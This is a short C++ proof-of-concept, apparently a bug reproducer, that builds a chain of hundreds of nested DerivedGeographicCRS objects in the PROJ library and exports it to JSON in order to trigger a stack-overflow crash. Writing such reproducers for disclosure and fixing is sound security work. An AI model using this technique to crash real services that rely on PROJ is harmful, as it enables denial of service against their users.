// SF01 PoC: Deep DerivedGeographicCRS chain causes stack overflow in _exportToJSON

#define FROM_PROJ_CPP

#include "proj/crs.hpp"
#include "proj/coordinateoperation.hpp"
#include "proj/coordinatesystem.hpp"
#include "proj/common.hpp"
#include "proj/io.hpp"
#include "proj/util.hpp"
#include "proj/metadata.hpp"
#include "proj/datum.hpp"
#include "proj/nn.hpp"

#include <iostream>
#include <string>

using namespace osgeo::proj::crs;
using namespace osgeo::proj::cs;
using namespace osgeo::proj::datum;
using namespace osgeo::proj::operation;
using namespace osgeo::proj::common;
using namespace osgeo::proj::util;
using namespace osgeo::proj::io;
using namespace osgeo::proj::metadata;

int main(int argc, char* argv[]) {
    int depth = 500;
    if (argc > 1) {
        depth = std::stoi(argv[1]);
    }

    std::cout << "Building DerivedGeographicCRS chain with depth " << depth << std::endl;

    auto geogCRS = GeographicCRS::create(
        PropertyMap().set(IdentifiedObject::NAME_KEY, "WGS 84"),
        GeodeticReferenceFrame::create(
            PropertyMap().set(IdentifiedObject::NAME_KEY, "World Geodetic System 1984"),
            Ellipsoid::createFlattenedSphere(
                PropertyMap().set(IdentifiedObject::NAME_KEY, "WGS 84"),
                Length(6378137.0),
                Scale(298.257223563)
            ),
            optional<std::string>(),
            PrimeMeridian::create(
                PropertyMap().set(IdentifiedObject::NAME_KEY, "Greenwich"),
                Angle(0.0))
        ),
        EllipsoidalCS::createLatitudeLongitude(UnitOfMeasure::DEGREE)
    );

    auto conv = Conversion::create(
        PropertyMap().set(IdentifiedObject::NAME_KEY, "pole_rotation"),
        PropertyMap().set(IdentifiedObject::NAME_KEY,
                          "PROJ ob_tran o_proj=latlong o_lon_p=0 o_lat_p=90"),
        std::vector<OperationParameterNNPtr>{},
        std::vector<ParameterValueNNPtr>{}
    );

    auto cs = EllipsoidalCS::createLatitudeLongitude(UnitOfMeasure::DEGREE);

    // Build chain
    GeodeticCRSNNPtr current = geogCRS;
    for (int i = 1; i <= depth; i++) {
        auto derived = DerivedGeographicCRS::create(
            PropertyMap().set(IdentifiedObject::NAME_KEY, "level_" + std::to_string(i)),
            current, conv, cs
        );
        current = derived;
    }

    std::cout << "Chain built. Exporting to JSON..." << std::endl;
    try {
        auto formatter = JSONFormatter::create();
        std::string json = current->exportToJSON(formatter.get());
        std::cout << "JSON export OK, length=" << json.size() << std::endl;
    } catch (const std::exception &e) {
        std::cerr << "JSON exception: " << e.what() << std::endl;
        return 1;
    }

    std::cout << "Done." << std::endl;
    return 0;
}
